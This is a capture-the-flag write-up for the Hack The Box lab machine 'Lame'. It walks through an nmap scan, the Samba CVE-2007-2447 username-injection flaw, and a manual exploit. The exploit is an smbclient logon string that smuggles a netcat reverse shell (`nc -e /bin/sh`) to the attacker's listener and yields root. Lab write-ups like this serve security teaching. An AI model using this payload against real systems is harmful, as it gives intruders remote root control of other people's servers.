Hack The Box: Lame Write-up

July 15, 2026 HackTheBox Reading time: 5 mins

Lame is the very first machine released on Hack The Box. It is an easy Linux machine showing common security mistakes in Samba service configuration, specifically running a vulnerable version of Samba.

1. Enumeration and Port Scanning

We initiate our reconnaissance phase using nmap to discover running TCP services on the target IP 10.10.10.3. 

$ nmap -sC -sV -p- -T4 -oA nmap/lame 10.10.10.3
Starting Nmap 7.92
Nmap scan report for 10.10.10.3
Host is up (0.052s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  microsoft-ds Samba smbd 3.0.20-Debian

The scan results reveal four open ports:

  • Port 21: FTP service using vsftpd 2.3.4. While vsftpd 2.3.4 has a known backdoor vulnerability, testing revealed it was not exploitable here.
  • Port 22: SSH service running OpenSSH 4.7p1.
  • Port 139/445: SMB service running Samba 3.0.20-Debian.

2. Vulnerability Assessment

Conducting search queries for Samba 3.0.20 reveals a prominent vulnerability: CVE-2007-2447, also known as the usermap_script Remote Code Execution vulnerability.

CVE-2007-2447 permits remote attackers to execute arbitrary shell commands via shell metacharacters in a username when using the MS-RPC interface, leading to command execution with root privileges.

3. Exploitation (Manual Vector)

Instead of launching Metasploit, we can execute this manually using the Python script or by connecting directly through smbclient.

First, we start a netcat listener on our machine (port 4444): 

$ nc -lvnp 4444
listening on [any] 4444 ...

Next, we access the SMB share using smbclient and pass our reverse shell payload inside the username field: 

$ smbclient //10.10.10.3/tmp
Password: 
smb: \> logon "/=`nohup nc -e /bin/sh 10.10.14.4 4444`"
Password:

Upon executing the logon command, our netcat listener instantly catches a connection: 

connect to [10.10.14.4] from (UNKNOWN) [10.10.10.3] 52312
id
uid=0(root) gid=0(root)
whoami
root

We have gained root access on the machine. Flags can be located in /home/user/user.txt and /root/root.txt.
